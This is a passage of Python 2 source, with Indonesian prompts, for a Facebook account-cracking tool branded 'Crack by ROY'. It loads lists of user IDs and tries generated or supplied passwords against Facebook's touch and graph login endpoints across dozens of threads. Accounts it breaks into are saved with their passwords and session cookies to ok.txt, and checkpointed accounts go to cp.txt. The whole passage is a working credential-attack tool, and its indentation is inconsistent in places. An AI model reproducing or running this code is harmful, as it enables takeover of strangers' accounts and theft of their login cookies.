		while True:
			f=raw_input("\033[0;93m[?] Pilih	: ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;93m[!] Contoh	: pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;92m───────────────────────────────────────────────")
				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                print ("\033[0;92m───────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\033[0;92m[✓] Selesai")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;93m[?] Password List	: ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;92m───────────────────────────────────────────────")
			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                        print ("\033[0;92m───────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("\033[0;92m[✓] Selesai")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m[ID]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r[Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack3:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;93m[?] Pilih	: ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;93m[!] Contoh : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;93m[?] ID List File: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;92m───────────────────────────────────────────────")
				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                print ("\033[0;92m───────────────────────────────────────────────")
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				print("\033[0;92m[✓] Selesai")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;93m[?] Password List	: ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;92m───────────────────────────────────────────────")
			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                        print ("\033[0;92m───────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("\033[0;92m[✓] Selesai")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=graph_fb(fl.get("id"),
					i,"https://graph.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r\033[0;93m[ID]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r[Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
if __name__=='__main__':
  menu()
